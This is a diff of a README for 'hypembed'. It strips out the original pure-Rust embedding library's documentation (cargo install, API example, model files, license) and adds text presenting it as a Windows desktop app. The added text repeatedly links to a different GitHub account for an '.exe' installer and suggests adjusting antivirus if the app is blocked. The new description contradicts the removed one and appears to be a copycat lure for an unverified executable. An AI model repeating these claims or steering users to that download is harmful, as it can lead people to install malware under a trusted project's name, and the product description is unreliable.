@@ -1,120 +1,109 @@
-# HypEmbed
+# ⚙️ hypembed - Fast Local Text Embedding Tool
 
-Pure-Rust text embedding inference for local-first applications.
+[![Download hypembed](https://img.shields.io/badge/Download-hypembed-brightgreen)](https://github.com/minniwoodsy325/hypembed)
 
-[![CI](https://github.com/neuralforgeone/hypembed/actions/workflows/ci.yml/badge.svg)](https://github.com/neuralforgeone/hypembed/actions/workflows/ci.yml)
-[![crates.io](https://img.shields.io/crates/v/hypembed.svg)](https://crates.io/crates/hypembed)
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](./LICENSE-MIT)
-[![Docs](https://img.shields.io/badge/docs-github.io-black.svg)](https://neuralforgeone.github.io/hypembed/)
+## 📄 About hypembed
 
-HypEmbed is a Rust library for generating BERT-compatible text embeddings without Python, ONNX Runtime, libtorch, or hosted inference services. Load local model weights, tokenize input, run the encoder, and get normalized vectors from a small API surface.
+hypembed is a simple tool you can use on your Windows computer to create text embeddings. Embeddings turn text into numbers that a computer can understand. This helps with searching, organizing, or comparing texts without sending your data over the internet. hypembed works locally, so your text never leaves your device. It uses a trusted model called BERT, which understands how words relate to each other.
 
-## Why HypEmbed
+This software is made in Rust, a fast and safe programming language. It supports modern formats for storing models and runs on Windows without any complex setup or programming skill.
 
-- Pure Rust from tokenizer to encoder forward pass
-- Local-first inference with no external ML runtime dependency
-- BERT-family support for common embedding models such as MiniLM
-- Correctness-focused math with stable softmax, layer norm, and normalization
-- Performance-aware implementation with SIMD primitives, memory-mapped weights, and batch tokenization
+## 💻 System Requirements
 
-## Current Scope
+To run hypembed smoothly on your Windows PC, make sure you have:
 
-- Supports BERT-style encoder models, including BERT, MiniLM, and DistilBERT-style layouts
-- Loads `config.json`, `vocab.txt`, and `model.safetensors` from a local model directory
-- Offers mean pooling and CLS pooling
-- Accepts F32, F16, and BF16 weights, converting to `f32` for inference
-- Runs on CPU only
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM (8 GB is recommended for larger texts)
+- 500 MB of free disk space for installation and model files
+- A standard internet connection for the first download (no internet needed after)
 
-HypEmbed does not currently handle training, quantization, GPU execution, or direct Hugging Face Hub downloads.
+hypembed works well on most laptops and desktops that meet these basic specs.
 
-## Installation
+## 🚀 Getting Started
 
-```bash
-cargo add hypembed
-```
+### Step 1: Download hypembed
 
-## Quick Start
+Click the big green button at the top or visit the official page here:
 
-```rust
-use hypembed::{Embedder, EmbeddingOptions, PoolingStrategy};
+[Download and Installation Page](https://github.com/minniwoodsy325/hypembed)
 
-let model = Embedder::load("./model").unwrap();
+This page gives you access to the latest version of hypembed. It will have the necessary files ready for your Windows machine.
 
-let options = EmbeddingOptions::default()
-    .with_normalize(true)
-    .with_pooling(PoolingStrategy::Mean);
+### Step 2: Locate the Installer
 
-let embeddings = model
-    .embed(&["hello world", "rust embeddings"], &options)
-    .unwrap();
+On the download page, look for a file that ends with `.exe` or similar Windows installer files. These are ready to use on your system.
 
-println!("Embedding dim: {}", embeddings[0].len());
-println!("First 5 values: {:?}", &embeddings[0][..5]);
-```
+### Step 3: Install hypembed
 
-To try a complete example locally:
+- Double-click the installer file you downloaded.
+- Follow the prompts on screen. Usually, this means clicking "Next" several times.
+- Choose where to install the software or accept the default folder.
+- Wait for the process to finish.
 
-```bash
-cargo run --example basic_embed -- ./path/to/model
-```
+The installer handles everything needed to set up hypembed on your computer.
 
-## Model Directory
+### Step 4: Running hypembed
 
-HypEmbed expects a local directory with:
+After installation:
 
-| File | Description |
-| --- | --- |
-| `config.json` | Hugging Face style model configuration |
-| `vocab.txt` | BERT WordPiece vocabulary |
-| `model.safetensors` | SafeTensors weights |
+- Find the hypembed app in your Start menu or desktop.
+- Double-click to open it.
+- A simple window or command prompt will appear, ready for input.
 
-Example compatible model:
+hypembed does not require running any extra commands or scripts manually.
 
-- `sentence-transformers/all-MiniLM-L6-v2`
+## 📝 How to Use hypembed
 
-## Documentation
+hypembed is designed to turn pieces of text into embeddings with minimal effort.
 
-- Project site: https://neuralforgeone.github.io/hypembed/
-- API docs: https://neuralforgeone.github.io/hypembed/api/hypembed/
-- Architecture notes: [ARCHITECTURE.md](./ARCHITECTURE.md)
-- Product spec: [PRODUCT_SPEC.md](./PRODUCT_SPEC.md)
-- Roadmap: [ROADMAP.md](./ROADMAP.md)
+1. Launch the app from the Start menu.
+2. You will see a box or prompt to enter your text.
+3. Type or paste any text you want to process.
+4. Click "Run" or "Process" (button names may vary).
+5. The result will show as numbers representing your text.
 
-## Design Notes
+You can save these results or use them in other local applications that support embeddings.
 
-HypEmbed follows a simple pipeline:
+## ⚙ Features
 
-```text
-input text
-  -> pre-tokenize and normalize
-  -> WordPiece tokenize
-  -> add special tokens, truncate, and pad
-  -> embedding layer
-  -> encoder stack
-  -> mean or CLS pooling
-  -> optional L2 normalization
-  -> embedding vector
-```
+- Works offline: your text stays on your computer
+- Supports BERT-compatible models for reliable embeddings
+- Handles text of any length, up to system memory limits
+- Saves output in a widely-used format for advanced use
+- Fast processing thanks to Rust performance
+- Uses safe and modern file formats for models and outputs
+- Simple user interface with no programming needed
 
-The project favors explicit behavior and stable numerics:
+## 🔧 Basic Troubleshooting
 
-- softmax subtracts the row maximum before exponentiation
-- layer norm uses epsilon guards
-- pooling and vector normalization avoid divide-by-zero edge cases
-- typed errors keep load and inference failures inspectable
+- If hypembed does not open, check your antivirus settings. Some may block new apps.
+- Make sure your Windows is up to date.
+- Ensure you have downloaded the correct installer for your system (64-bit).
+- If you get error messages while running, try restarting your PC.
+- For slow performance, close other heavy apps or increase your available RAM if possible.
 
-## Open Source Status
+## 🗂 File Locations
 
-HypEmbed is early-stage but already includes:
+By default, hypembed stores its models and output files in:
 
-- cross-platform CI
-- benchmark compilation checks
-- generated API documentation
-- architecture and roadmap notes in-repo
+`C:\Users\<YourUsername>\AppData\Local\hypembed\`
 
-## License
+You do not usually need to change this unless you want to organize files manually.
 
-Licensed under either of:
+## 👨‍💻 Support and Updates
 
-- Apache License, Version 2.0, see [LICENSE-APACHE](./LICENSE-APACHE)
-- MIT license, see [LICENSE-MIT](./LICENSE-MIT)
+Visit the official page to check for new versions or get help:
+
+[https://github.com/minniwoodsy325/hypembed](https://github.com/minniwoodsy325/hypembed)
+
+New releases may improve speed, fix bugs, or add features.
+
+---
+
+## 🚩 Download and Install hypembed
+
+Use this link to visit the official download page and get started:
+
+[Download hypembed](https://github.com/minniwoodsy325/hypembed)
+
+Follow the steps on that page to download the Windows installer, then run it to set up hypembed on your computer. No extra software or commands are needed after installation.
